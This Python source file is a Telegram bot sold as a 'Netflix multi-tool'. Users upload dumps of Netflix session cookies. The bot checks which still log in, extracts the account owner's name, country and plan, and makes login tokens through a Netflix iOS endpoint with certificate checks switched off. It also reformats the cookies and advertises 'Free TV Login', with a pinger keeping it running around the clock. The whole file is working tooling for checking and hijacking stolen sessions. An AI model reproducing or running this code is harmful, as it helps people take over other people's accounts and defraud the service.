import os
import re
import json
import logging
import requests
import io
import zipfile
import hashlib
import tempfile
import time
import asyncio
import codecs
import html as html_mod
import random
import string
import threading
import http.server
import socketserver
from collections import OrderedDict, defaultdict
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes
)
from concurrent.futures import ThreadPoolExecutor
from telegram.error import BadRequest
from urllib3.exceptions import InsecureRequestWarning
import urllib.parse

# ----------------- कॉन्फिगरेशन -----------------
TOKEN = os.environ.get('BOT_TOKEN', "Bot Token Here")
OWNER_ID = 1115202962
ADMIN_IDS = [1115202962]
WATERMARK = "Made By @ShinchanNoharaTG | @M3UIndiaOriginal"

MAX_WORKERS = 20
BATCH_SIZE = 10
dot_length = 5

COOKIES_DIR = "vault"
PROXY_FILE = "proxy.txt"
REQUEST_TIMEOUT = 20
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

REQUIRED_COOKIES = ("NetflixId",)
OPTIONAL_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_COOKIE_NAMES = set(REQUIRED_COOKIES + OPTIONAL_COOKIES)
CANONICAL_NAMES = {name.lower(): name for name in ALL_COOKIE_NAMES}

cookie_lock = threading.Lock()
tv_stats_lock = threading.Lock()

user_locks = defaultdict(asyncio.Lock)
user_state = {}
user_executors = {}
user_tasks = {}

START_MSG = (
    "<code>\n"
    " █ NETFLIX MULTI-TOOL BOT █\n\n"
    "[ Step 1 ] Choose mode below\n"
    "[ Step 2 ] Upload .txt/.json/.zip file\n"
    "[ Step 3 ] Get results\n"
    "</code>"
)

MAIN_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔍 Check Account", callback_data="mode_check"),
     InlineKeyboardButton("🔑 Get NF Token", callback_data="mode_nftoken")],
    [InlineKeyboardButton("🧹 Clean Cookies", callback_data="mode_clean"),
     InlineKeyboardButton("📺 Free TV Login", callback_data="mode_tvlogin")]
])

CHECK_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("▶️ Start Checking", callback_data="start_check")]
])

STOP_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🛑 Stop", callback_data="stop_check")]
])

RESULT_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("📄 Get as .txt", callback_data="result_txt"),
     InlineKeyboardButton("📦 Get as .zip", callback_data="result_zip")]
])

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

# ----------------- 24x7 Render Pinger & HTTP Server -----------------
class PingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self): 
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Server Active")
    def log_message(self, format, *args):
        return

def run_always_on_pinger():
    time.sleep(20)
    while True:
        try:
            render_url = os.environ.get("RENDER_EXTERNAL_URL", "https://checker-9kyv.onrender.com")
            requests.get(render_url, timeout=12)
        except: 
            pass
        time.sleep(540)

def run_http_server():
    PORT = int(os.environ.get("PORT", 5000))
    with socketserver.TCPServer(("", PORT), PingHandler) as httpd:
        httpd.serve_forever()

# ----------------- कुकी आणि पार्सिंग फंक्शन्स -----------------
def safe_filename(name):
    return re.sub(r'[^a-zA-Z0-9_\-\.]', '_', name)

def clean_unicode(val):
    if not isinstance(val, str):
        return val
    try:
        val = codecs.decode(val, 'unicode_escape')
    except:
        pass
    try:
        val = html_mod.unescape(val)
    except:
        pass
    return val.encode('utf-8', errors='replace').decode('utf-8', errors='replace')

def safe_html(text):
    if not text:
        return "Unknown"
    return clean_unicode(str(text))

def dict_to_netscape(cookie_dict, domain=".netflix.com"):
    expiry = int(time.time()) + 180 * 24 * 3600
    lines = ["# Netscape HTTP Cookie File"]
    for k, v in cookie_dict.items():
        lines.append(f"{domain}\tTRUE\t/\tFALSE\t{expiry}\t{k}\t{v}")
    return "\n".join(lines)

def parse_cookie_file(text):
    text = text.strip()
    results = []
    try:
        if text.startswith("{") or text.startswith("["):
            obj = json.loads(text)
            if isinstance(obj, dict):
                cookie_dict = {k: str(v) for k, v in obj.items() if k in ALL_COOKIE_NAMES}
                if cookie_dict.get('NetflixId'):
                    results.append(("json_block", cookie_dict))
            elif isinstance(obj, list):
                merged = {c.get("name"): c.get("value") for c in obj if isinstance(c, dict) and c.get("name") in ALL_COOKIE_NAMES}
                if merged.get('NetflixId'):
                    results.append(("json_list", merged))
    except:
        pass

    netscape_entries = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            name, value = parts[5], parts[6]
            if name in ALL_COOKIE_NAMES:
                netscape_entries.append({"name": name, "value": value})
    
    if netscape_entries:
        merged = {e["name"]: e["value"] for e in netscape_entries}
        if merged.get('NetflixId'):
            results.append(("netscape_all", merged))
            
    return results

async def extract_cookies_from_zip(zip_path):
    cookies = []
    with zipfile.ZipFile(zip_path, 'r') as z:
        for info in z.infolist():
            if info.is_dir() or info.filename.startswith('__MACOSX'):
                continue
            if info.filename.lower().endswith(('.txt', '.json')):
                with z.open(info) as f:
                    try:
                        content = f.read().decode('utf-8', errors='ignore')
                        c = parse_cookie_file(content)
                        for idx, (blockname, cc) in enumerate(c):
                            cookies.append((f"{safe_filename(info.filename)}_{idx}", cc))
                    except:
                        continue
    return cookies

def check_netflix_cookie(cookie_dict):
    if not cookie_dict.get('NetflixId'):
        return {'ok': False, 'reason': 'No NetflixId'}
    session = requests.Session()
    session.cookies.update(cookie_dict)
    headers = {'User-Agent': USER_AGENT, 'Accept': 'text/html,application/xhtml+xml'}
    try:
        r = session.get('https://www.netflix.com/YourAccount', headers=headers, timeout=20, allow_redirects=True)
        if r.status_code != 200 or 'login' in r.url.lower():
            return {'ok': False, 'reason': 'Dead'}
        
        txt = r.text
        def find(pat):
            m = re.search(pat, txt)
            return m.group(1) if m else "Unknown"

        return {
            'ok': True, 'premium': True,
            'name': find(r'"accountOwnerName"\s*:\s*"([^"]+)"'),
            'country': find(r'"countryOfSignup"\s*:\s*"([^"]+)"'),
            'plan': find(r'"localizedPlanName".*?"value":"([^"]+)"'),
            'cookie': cookie_dict
        }
    except:
        return {'ok': False, 'reason': 'Error'}

def generate_nftoken(cookie_dict):
    netflix_id = cookie_dict.get('NetflixId')
    if not netflix_id:
        return None, "No NetflixId"
    try:
        url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
        headers = {"User-Agent": "Argo/15.48.1", "Cookie": f"NetflixId={netflix_id}"}
        r = requests.get(url, headers=headers, timeout=15, verify=False)
        data = r.json()
        token = data.get("value", {}).get("account", {}).get("token", {}).get("default", {}).get("token")
        if token:
            return {'token': token, 'expires': 'Valid'}, None
    except:
        pass
    return None, "Failed"

# ----------------- टेलिग्राम हँडलर्स -----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_state[user_id] = {'mode': 'check', 'cookies': []}
    await update.message.reply_html(START_MSG, reply_markup=MAIN_MARKUP)

async def mode_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    modes = {"mode_check": "check", "mode_nftoken": "nftoken", "mode_clean": "clean", "mode_tvlogin": "tvlogin"}
    if query.data in modes:
        mode = modes[query.data]
        user_state[user_id] = {'mode': mode, 'cookies': []}
        await query.answer("Mode selected!")
        await context.bot.send_message(query.message.chat_id, f"✅ Mode: <b>{mode.upper()}</b>\n\nNow send your <b>.txt</b> or <b>.zip</b> file!", parse_mode='HTML')

async def file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.document:
        return
    user_id = update.effective_user.id
    if user_id not in user_state:
        user_state[user_id] = {'mode': 'check', 'cookies': []}
        
    mode = user_state[user_id].get('mode', 'check')
    file = await update.message.document.get_file()
    
    with tempfile.TemporaryDirectory() as td:
        tp = os.path.join(td, update.message.document.file_name)
        await file.download_to_drive(tp)
        with open(tp, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            
        if mode == "clean":
            parsed = parse_cookie_file(content)
            if parsed:
                netscape_str = dict_to_netscape(parsed[0][1])
                buf = io.BytesIO(netscape_str.encode("utf-8"))
                buf.seek(0)
                await update.message.reply_document(document=InputFile(buf, filename="cleaned_cookies.txt"), caption="🧹 <b>Here is your cleaned cookie file!</b>", parse_mode='HTML')
            else:
                await update.message.reply_text("❌ No valid cookies found to clean!")
            return
            
        # Check / Token mode
        cookies = []
        if update.message.document.file_name.lower().endswith('.zip'):
            cookies = await extract_cookies_from_zip(tp)
        else:
            parsed = parse_cookie_file(content)
            cookies = [(f"cookie_{i}", c) for i, (_, c) in enumerate(parsed)]
            
        if not cookies:
            await update.message.reply_text("❌ No valid Netflix cookies found in the file!")
            return
            
        user_state[user_id]['cookies'] = cookies
        await update.message.reply_html(f"✅ Loaded <b>{len(cookies)}</b> cookies successfully!\n\nClick below to start processing.", reply_markup=CHECK_MARKUP)

async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    cookies = user_state.get(user_id, {}).get('cookies', [])
    mode = user_state.get(user_id, {}).get('mode', 'check')
    
    if not cookies:
        await query.answer("No cookies loaded! Please upload a file first.")
        return
        
    await query.answer("Processing started...")
    status_msg = await query.message.reply_text(f"⏳ Processing <b>{len(cookies)}</b> cookies...", parse_mode='HTML')
    
    hits = []
    for nm, ck in cookies[:20]: # एकावेळी जास्तीत जास्त २० कुकीज तपासेल
        if mode == 'nftoken':
            res, _ = generate_nftoken(ck)
            if res:
                hits.append(f"Token: {res['token']}")
        else:
            res = check_netflix_cookie(ck)
            if res.get('ok'):
                hits.append(f"Name: {res.get('name')} | Country: {res.get('country')} | Plan: {res.get('plan')}")
                
    if hits:
        buf = io.BytesIO(("\n\n".join(hits)).encode("utf-8"))
        await context.bot.send_document(query.message.chat_id, document=InputFile(buf, filename="results.txt"), caption=f"✅ <b>Done! Found {len(hits)} working results.</b>", parse_mode='HTML')
    else:
        await status_msg.edit_text("❌ No working hits found in the uploaded file.")

# ----------------- मुख्य कार्यान्वयन (Main) -----------------
if __name__ == "__main__":
    os.makedirs(COOKIES_DIR, exist_ok=True)
    
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(mode_button, pattern="^mode_"))
    app.add_handler(CallbackQueryHandler(start_check, pattern="^start_check$"))
    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, file_upload))
    
    # बॅकग्राउंड पिंगर आणि सर्व्हर
    threading.Thread(target=run_always_on_pinger, daemon=True).start()
    threading.Thread(target=run_http_server, daemon=True).start()
    
    # टेलिग्राम बॉट चालू करणे
    app.run_polling(allowed_updates=Update.ALL_TYPES)
